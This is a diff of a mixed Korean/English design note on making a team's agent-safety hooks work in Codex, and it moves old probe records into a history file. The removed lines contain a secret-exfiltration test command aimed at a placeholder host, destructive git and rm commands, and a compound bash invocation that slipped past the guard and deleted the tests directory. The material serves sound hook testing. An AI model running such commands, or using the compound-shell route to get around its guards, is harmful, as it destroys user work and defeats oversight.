@@ -13,71 +13,7 @@ team-harness의 `harness-guard`는 Claude Code 훅·스킬을 1차 대상으로 
 
 ## Native Codex Capabilities
 
-Codex에 보안·리뷰·훅 기능이 없다고 보면 안 된다. 2026-07-09 현재 설치본과 새로 받은 Codex manual 기준으로
-다음이 확인됐다.
-
-`codex features list`:
-
-```text
-guardian_approval                    stable             true
-hooks                                stable             true
-plugins                              stable             true
-```
-
-Codex manual은 Codex Security를 Codex용 security-review plugin으로 설명하고, 로컬 Codex thread에서 repository
-scan과 code-change review를 수행하는 워크플로를 문서화한다. Auto-review도 별도 기능으로 존재하지만, 이는 권한
-확대가 아니라 sandbox 경계에서 사람 승인 대신 별도 reviewer agent가 승인 요청을 검토하는 구조다.
-
-2026-07-09 probe 당시 로컬 plugin 상태는 Codex native 보안 기능과 Claude plugin 호환 문제를 분리해서 봐야
-함을 보여줬다.
-
-```text
-security-guidance@claude-plugins-official  installed, enabled  2.0.6
-harness-guard@team-harness                 installed, enabled  0.35.2
-codex-security@openai-curated              not installed
-```
-
-2026-07-10 05:41 KST에는 반복되는 invalid PostToolUse JSON 오류를 멈추기 위해 Codex 로컬 설정
-(`~/.codex/config.toml`)에서 `security-guidance@claude-plugins-official`만 임시로 `enabled = false`로
-바꿨고, `harness-guard@team-harness`는 `enabled = true`를 유지했다. 백업은
-`/private/tmp/codex-config.backup.20260710054153.toml`에 있다.
-
-이 임시 비활성화는 최종 상태가 아니다. 2026-07-10 후속 수정(v0.36.0)은
-`plugins/harness-guard/scripts/codex-security-guidance-adapter.mjs`를 추가해 Claude
-`security-guidance`가 내보내는 `metrics`/`rewakeSummary` 같은 Claude-only 필드를 Codex-safe 출력으로
-정규화한다. 로컬 Codex 적용은
-`plugins/harness-guard/scripts/patch-codex-security-guidance.mjs`가 수행한다: Codex의
-`security-guidance@claude-plugins-official` 플러그인은 다시 `enabled = true`로 두고, 해당 플러그인의
-Codex cache `hooks/hooks.json` command만 adapter 경유로 패치한다. Codex는 hook 정의의 현재 hash를 신뢰
-상태로 기록하므로, command가 바뀐 뒤에는 새 hook hash를 `/hooks`에서 review/trust해야 실제 세션에서
-실행된다. Claude Code 전역 설정은 바꾸지 않는다.
-
-Codex 0.144.0은 Claude `type: "prompt"` hook을 아직 지원하지 않아 `harness-guard` 로드 때 해당 handler를
-skip한다. v0.37.0의 `patch-codex-harness-guard.mjs`는 Codex local cache에서 그 unsupported handler만 제거하고,
-구버전 cache의 YAML-invalid `argument-hint` scalar도 quote한다. `guard.sh`와 `route-intent.mjs` command hook은
-그대로 유지하며, Claude가 읽는 원본 `hooks.json`과 SKILL source는 수정하지 않는다.
-
-2026-07-10의 fresh `codex exec --ephemeral` (CLI 0.144.1) 반증 probe에서는 `unified_exec`가
-`PreToolUse`를 발생시키지 않았다. `API_KEY=probe-secret curl -d "$API_KEY" https://example.invalid/collect`는
-`UserPromptSubmit`만 거친 뒤 DNS 실패까지 실행됐다. Codex 공식 Hooks 문서도 `PreToolUse`가 현재 simple shell
-호출만 intercept하며 `unified_exec` interception은 incomplete라고 명시한다. 그러므로 이 경로에서는
-`harness-guard`의 command hook을 Claude와 동등한 secret-egress enforcement로 주장할 수 없다(#283).
-후속 재검증에서 `codex exec`는 전역 `approval_policy = "untrusted"`와 달리 `approval: never`로 표시됐다.
-따라서 non-interactive exec에 사람 승인 경계가 있다고 주장하지 않는다. v0.49.0 hardened CLI launcher는
-`--disable unified_exec`를 주입하며, fresh ephemeral `pwd` probe에서 실제 `PreToolUse` 발화를 확인했다.
-v0.55.0은 공식 admin-enforced system requirements에 `unified_exec=false`, `hooks=true`를 pin하는 installer를
-추가해 launcher 밖의 일반 CLI·cmux·Desktop도 같은 simple-shell hook 경로를 사용하게 한다. launcher flag는
-cache 자동복구와 하위 버전 방어를 위해 중복 유지한다.
-
-Conclusion: Codex에서 보안 리뷰를 원하면 `security-guidance@claude-plugins-official`을 그대로 신뢰하지 말고
-Codex Security plugin, Auto-review, sandbox/permissions/rules를 Codex native 경계로 검토해야 한다.
-`security-guidance`의 현재 오류는 Codex 기능 부재가 아니라 Claude Code hook/output 계약을 Codex에 그대로 가져온
-호환성 문제로 분류한다.
-
-2026-07-23 Codex 0.144.6 재검증에서는 unified exec가 `PreToolUse` command hook을 지원한다. v0.61.0부터
-`harness-guard`는 `.codex-plugin/plugin.json`, `codex/hooks/hooks.json`, `codex/skills/*/SKILL.md`를 source에
-직접 제공한다. harness plugin cache patch, overlay 주입, custom agent 복사, unified exec 강제 비활성화는
-제거했다. 위 0.144.0~0.144.1 기록은 당시 한계의 이력이며 현재 설치 절차가 아니다.
+[기능 확인 이력](codex-guard-compatibility-native-history.md)은 당시 버전·후보의 결과다. 현행 계약은 아래 Semantic Parity Matrix와 Native Refresh Runbook을 함께 따른다.
 
 ## Semantic Parity Matrix
 
@@ -95,7 +31,7 @@ Codex Security plugin, Auto-review, sandbox/permissions/rules를 Codex native �
 | `codex/hooks/hooks.json` | 해당 없음 | `PLUGIN_ROOT` 기반 command hook 2개 | Codex 공식 hook 계약 | `codex-native-loader-test.sh` |
 | `codex/skills/*.md` | 해당 없음 | 17개 native wrapper가 공용 skill 계약 참조 | cache 변형 없는 skill 연결 | native loader + mapping tests |
 | `scripts/codex-security-guidance-adapter.mjs` | Claude security-guidance raw output | Codex-safe output adapter | Codex-native 대체, PostToolUse 실측 | `codex-security-guidance-adapter-test.sh` |
-| `scripts/patch-codex-security-guidance.mjs` | 해당 없음 | cache command patch + enable | Codex-native 설치 절차 | adapter patch test |
+| `scripts/patch-codex-security-guidance.mjs` | 해당 없음 | 별도 승인 `--apply` 또는 읽기 전용 `--dry-run` | deprecated optional compatibility; launcher에서 분리 | adapter patch test |
 | `scripts/check-codex-native-plugin.mjs` | 해당 없음 | 설치 source의 manifest·hooks·17 skills read-only 검사 | native 상태 검증 | launcher·doctor tests |
 | `scripts/sync-codex-plugin-cache.mjs` | 해당 없음 | source가 더 새로울 때 team-harness marketplace·plugin만 갱신 | Codex-native 설치 절차 | `codex-plugin-cache-sync-test.sh` |
 | `scripts/codex-hardened.sh` | 해당 없음 | plugin sync·native 계약 확인 후 인자 그대로 전달 | 얇은 CLI 검증 경로 | launcher + sync tests + fresh probe |
@@ -175,174 +111,57 @@ node /path/to/release-source/scripts/check-codex-native-plugin.mjs --expected-ve
 4. 모델·승인·sandbox·역할 설정과 다른 plugin은 보존한다. 머신의 managed requirements 변경은 별도 관리자 작업이며 단순 plugin 갱신에 묶지 않는다.
 5. hook 신뢰·실제 차단 검증은 별개다. `/hooks`에서 변경 hash를 검토하고, 필요한 경우에만 승인된 격리 환경의 합성 fixture로 발화를 확인한다. 실제 인증 파일·시크릿을 probe 입력으로 쓰지 않는다. skill 로딩 성공을 hook 발화·권한 집행으로 보고하지 않는다.
 
-`security-guidance` adapter patch는 외부 plugin cache와 marketplace snapshot 및 활성화 설정을 바꾸는 별도 작업이다. 이 변경까지 명시적으로 승인된 환경에서만 기존 patch/launcher를 사용한다. Team Harness 갱신에 필수로 묶지 않는다.
+`security-guidance` adapter는 native plugin 갱신과 별개다. 현행 launcher는 외부 adapter patch나 enablement를 실행하지 않는다.
+외부 cache·marketplace·config 변경이 별도로 승인된 환경에서만 legacy patcher의 `--apply`를 사용한다.
+`--dry-run`은 읽기 전용이며 둘 중 정확히 하나가 필요하다. 인자 누락·미지원·중복·충돌은 상태 접근 전에 exit 2다.
 
 ### CLI 자동 복구 launcher
 
-외부 `security-guidance` 수정까지 승인된 기존 cmux 환경은 `scripts/codex-hardened.sh`를 선택할 수 있다. 이 launcher는 시작 직전에
-source manifest가 설치 plugin보다 새로울 때만 공식 Codex CLI로 `team-harness` marketplace와
-`harness-guard` plugin을 갱신한다. 이어서 native 계약 검사와 `security-guidance` adapter patch를 순서대로
-적용하며, 동기화나 검사가 하나라도 실패하면 Codex를 실행하지 않는다. 버전이 같거나 설치본이 더 새로우면
-marketplace 네트워크 호출을 생략한다. `approval_policy = "untrusted"`는 변경하지 않는다.
-
-현재 checkout을 최신 `develop`으로 갱신한 뒤, zsh에서 다음 alias를 명시적으로 설치할 수 있다.
+`scripts/codex-hardened.sh`는 공식 Harness 등록·동기화와 native 계약·binary trust 검사를 수행한다.
+검사 실패 시 Codex를 실행하지 않는다. 이 경로에 외부 `security-guidance` patch·활성화가 묶이지 않는다.
+현재 checkout을 갱신한 뒤, zsh에서 다음 alias를 명시적으로 설치할 수 있다.
 
 ```zsh
 alias codex='bash "$HOME/team-harness/scripts/codex-hardened.sh"'
 ```
 
-영구 설치는 `.zshrc`에 같은 alias를 넣고 새 shell을 열어 확인한다. 제거하려면 해당 alias 한 줄만 지운다.
+영구 설치는 `.zshrc`에 같은 alias를 넣고 새 shell에서 확인한다. 제거는 그 alias 한 줄만 지운다.
 Desktop은 launcher를 실행하지 않으므로 plugin 갱신 뒤 doctor로 native 상태를 별도 확인한다.
-hook 활성화는 system requirements가 launcher와 독립적으로 강제한다.
+이 계약 변경의 로컬 검증은 [3E 실행 근거](harness-modernization/execution-m3e.json)를 따른다.
+전역 alias·실제 vendor cache 변경과 native app 실행 인수는 별도 단계다.
+[이전 mandatory adapter 경로](codex-guard-compatibility-native-history.md)는 아래 역사로 보존하며 현행 명령으로 사용하지 않는다.
 
 ## Custom Agent Validation Status (historical)
 
-2026-07-10에는 세 agent를 `gpt-5.6-terra`/medium으로 고정했으나 이는 당시 계정 표본을 플러그인 계약으로
-일반화한 오류였다. Codex 공식 custom-agent 계약은 생략한 `model`이 부모 session을 상속한다고 명시한다.
-2026-07-12부터 model slug를 제거하고 explorer=low, verifier/security=high reasoning만 역할별로 지정한다.
-사용자 플랜이 지원하는 실제 model은 부모 `/model` 선택이 결정한다.
-
-quota 복구 뒤 새 저장형 Codex session에서 `harness-verifier`를 명시 spawn해 `AGENTS.md:31`의
-main/develop 직접 commit/push 금지 규칙을 read-only로 정확히 반환하는 것을 확인했다. `--ephemeral`은
-subagent thread를 만들 수 없어 probe 대상이 아니다. 이 custom agent 복사 방식은 v0.61.0에서 제거됐다.
-구조·설치 회귀는 `codex-skill-mapping-test.sh`와 `codex-native-loader-test.sh`가 보장하고 실제 subagent 선택은
-플랫폼에 위임한다.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ## Codex Security Evaluation
 
-2026-07-10에 `codex-security@openai-curated` v0.1.11을 설치해 native `security-diff-scan`을 실행했다.
-대상은 v0.40.0..v0.41.0의 Codex PreToolUse wrapper 변경이며, scan artifact는 로컬
-`/private/tmp/team-harness-security-264`에만 작성했다. repository 파일은 변경하지 않았다.
-
-- 결과: source-like worklist 3개 complete, reportable finding 0개.
-- 근거: `report.md`, `findings.json`, `coverage.json`, SARIF artifact. 위 artifact는 로컬 평가 증거이며
-  repo의 영구 상태 저장소는 아니다.
-- 결론: Codex Security는 Claude `security-reviewer`를 **대체하지 않고 보완**하는 Codex-native,
-  수동/PR diff security review 경로로 채택한다.
-- 한계: 이번 평가는 v0.40.0..v0.41.0 diff scan이며 전체 repository scan 또는 runtime network policy
-  enforcement을 의미하지 않는다. `security-guidance` adapter, Codex sandbox/approval, branch protection/CI는
-  계속 각각의 역할을 유지한다.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ## Live Probe Results
 
-2026-07-09 현재 Codex 세션에서 throwaway clone을 만들어 직접 실행했다. 아래 결과는 문서 추정이 아니라 실제
-실행 출력 기준이다.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ### Direct destructive commands
 
-`git reset --hard`:
-
-```text
-Command blocked by PreToolUse hook: ⛔ [guard] git reset --hard 금지 — 미커밋 변경사항 전체 삭제 위험
-해결: 필요한 경우 사용자가 직접 실행 (Claude가 대신 실행하지 않음). Command: git reset --hard
-```
-
-Result: blocked.
-
-`rm -rf tests`:
-
-```text
-Command blocked by PreToolUse hook: ⛔ [guard] 검증기(테스트/마이그레이션) 삭제 금지 — 게이트 무력화 방지
-해결: 정 필요하면 사용자가 직접 실행하세요 (Claude가 대신 삭제하지 않음). Command: rm -rf tests
-```
-
-Result: blocked.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ### Wrapper prefixes
 
-The following forms were blocked in the active Codex plugin-hook path:
-
-- `env git reset --hard`
-- `/usr/bin/time git reset --hard`
-- `sudo -n git reset --hard`
-- `env rm -rf tests`
-- `/usr/bin/time rm -rf tests`
-- `sudo -n rm -rf tests`
-
-The guard message preserved the original wrapper in the trailing `Command:` field.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ### Compound shell hole
 
-This command passed:
-
-```bash
-bash -lc "git status --short && rm -rf tests"
-```
-
-The command exited `0` with no guard block. Follow-up checks in the throwaway clone showed:
-
-```text
-tests-missing
- D tests/activerecord-destructive-ddl-test.sh
- D tests/alembic-destructive-ddl-test.sh
- D tests/alembic-heads-test.sh
-```
-
-Result: passed, and deleted `tests/`. This is the concrete category(b) local destruction porosity point.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ## Codex Config Hook Probe
 
-A temporary user config hook was injected into `~/.codex/config.toml` and then restored from backup. `hooks/list` in a separate
-app-server session could see the hook, but the already-running Codex session did not hot-load or execute it for the current tool
-path. A marker command executed normally and the hook payload file was not created:
-
-```text
-CODEX_CONFIG_PROBE_BLOCK
-payload-missing
-```
-
-Conclusion: do not treat a config edit in an already-running Codex session as proof that `[hooks]` is active for that session.
-Fresh-session validation is required for user config hooks.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ## PostToolUse and Stop Hook Mismatch
 
-터미널에서 다음 오류가 반복됐다.
-
-```text
-PostToolUse hook (failed)
-  error: hook returned invalid post-tool-use JSON output
-```
-
-The active hook source was:
-
-```text
-~/.codex/plugins/cache/claude-plugins-official/security-guidance/2.0.6/hooks/hooks.json
-```
-
-That hook uses Claude Code fields and output assumptions:
-
-- `asyncRewake`
-- `rewakeMessage`
-- `rewakeSummary`
-- Claude `SyncHookJSONOutput`
-- Stop-path `decision:"block"` / `reason`
-- PostToolUse-path `hookSpecificOutput.additionalContext`
-
-The installed Codex app-server schema for configured command hooks exposes `type`, `command`, `async`, `timeoutSec`,
-`statusMessage`, and `commandWindows`. It does not establish that the Claude Code async rewake contract is valid in Codex.
-The current Codex manual also states that `async` command hooks are parsed but not supported, and such handlers are skipped.
-
-The Claude plugin source is explicit about its target contract:
-
-```text
-Write a SyncHookJSONOutput line to stdout for Claude Code to pick up.
-```
-
-For PostToolUse guidance, the same source emits:
-
-```json
-{
-  "hookSpecificOutput": {
-    "hookEventName": "PostToolUse",
-    "additionalContext": "..."
-  }
-}
-```
-
-Conclusion: Claude-only PostToolUse/Stop hooks should not be loaded raw in Codex. They must be wrapped by a Codex-specific
-adapter that preserves guidance while removing unsupported Claude-only fields. In Codex,
-`security-guidance@claude-plugins-official` and `codex-security@openai-curated` remain different options with different
-contracts.
+관련 판단 전에 [전체 본문](codex-guard-compatibility-probes-2026-07.md)을 읽는다.
 
 ## Proposed Boundary
 
